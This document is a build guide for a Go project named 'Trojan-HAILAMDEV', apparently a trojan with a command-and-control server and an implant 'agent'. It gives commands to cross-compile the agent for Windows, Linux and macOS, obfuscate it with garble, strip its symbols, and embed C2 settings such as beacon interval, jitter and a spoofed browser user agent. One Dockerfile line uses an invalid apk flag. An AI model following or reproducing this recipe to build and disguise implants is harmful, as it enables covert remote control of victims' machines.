# Build Instructions

## Prerequisites
- Go 1.21+
- Git
- Make (optional)

## Quick Start

### 1. Clone and Setup
```bash
cd /home/hainx/Documents/Trojan-HAILAMDEV
go mod tidy
```

### 2. Generate Certificates
```bash
mkdir -p certs
go run src/agent/builder.go
# Or manually:
openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.pem -days 365 -nodes -subj "/CN=localhost"
```

### 3. Build C2 Server
```bash
go build -o bin/c2 src/c2/main.go
```

### 4. Build Agent
```bash
go build -o bin/agent src/agent/main.go
```

### 5. Run C2 Server
```bash
./bin/c2
# Server starts on https://0.0.0.0:8443
```

### 6. Deploy Agent
```bash
./bin/agent
# Agent connects to C2 at wss://127.0.0.1:8443/agent/ws
```

## Cross-Compilation

### Windows Agent
```bash
GOOS=windows GOARCH=amd64 go build -o bin/agent.exe src/agent/main.go
```

### Linux Agent
```bash
GOOS=linux GOARCH=amd64 go build -o bin/agent_linux src/agent/main.go
```

### macOS Agent
```bash
GOOS=darwin GOARCH=amd64 go build -o bin/agent_macos src/agent/main.go
# For Apple Silicon:
GOOS=darwin GOARCH=arm64 go build -o bin/agent_macos_arm src/agent/main.go
```

## Obfuscated Build

### Using Garble
```bash
go install mvdan.cc/garble@latest
garble -literals -tiny -seed=random build -o bin/agent_obf src/agent/main.go
```

### Using Builder
```bash
go run src/agent/builder.go
# Generates build/agent.go with embedded config
```

## Configuration

### C2 Server Config (config/config.yaml)
```yaml
c2:
  host: "0.0.0.0"
  port: 8443
  tls_cert: "certs/server.pem"
  tls_key: "certs/server.key"
  heartbeat_timeout: 120
  max_agents: 1000

agent:
  beacon_interval: 30
  jitter: 0.3
  max_retries: 3
  reconnect_delay: 60
  user_agent: "Mozilla/5.0..."

crypto:
  algorithm: "AES-256-GCM"
  key_rotation_interval: 3600
  curve: "X25519"
```

### Agent Config (embedded at build time)
The builder embeds configuration directly into the agent binary:
- C2 host/port
- Beacon interval/jitter
- Enabled modules
- TLS settings

## Build Flags

### Strip Symbols
```bash
go build -ldflags="-s -w" -o bin/agent src/agent/main.go
```

### Version Info
```bash
go build -ldflags="-X main.version=1.0.0 -X main.buildDate=$(date -u +%Y-%m-%dT%H:%M:%SZ)" -o bin/agent src/agent/main.go
```

## Docker Build

### C2 Server
```dockerfile
FROM golang:1.21-alpine AS builder
WORKDIR /app
COPY . .
RUN go mod tidy && go build -o c2 src/c2/main.go

FROM alpine:latest
RUN apk --no-add ca-certificates
WORKDIR /app
COPY --from=builder /app/c2 .
COPY --from=builder /app/config ./config
COPY --from=builder /app/certs ./certs
EXPOSE 8443
CMD ["./c2"]
```

### Agent
```dockerfile
FROM golang:1.21-alpine AS builder
WORKDIR /app
COPY . .
RUN go mod tidy && go build -ldflags="-s -w" -o agent src/agent/main.go

FROM alpine:latest
WORKDIR /app
COPY --from=builder /app/agent .
CMD ["./agent"]
```

## Troubleshooting

### Module Not Found
```bash
go mod download
go mod verify
```

### TLS Certificate Issues
```bash
# Regenerate certs
rm -rf certs && mkdir certs
openssl req -x509 -newkey rsa:2048 -keyout certs/server.key -out certs/server.pem -days 365 -nodes -subj "/CN=localhost"
```

### Connection Refused
- Check firewall rules
- Verify C2 server is running
- Check host/port in config
- Ensure TLS matches (both enabled or both disabled)

### Agent Not Connecting
- Check C2 host/port in agent config
- Verify network connectivity
- Check TLS certificate validation (InsecureSkipVerify for self-signed)
- Review logs for connection errors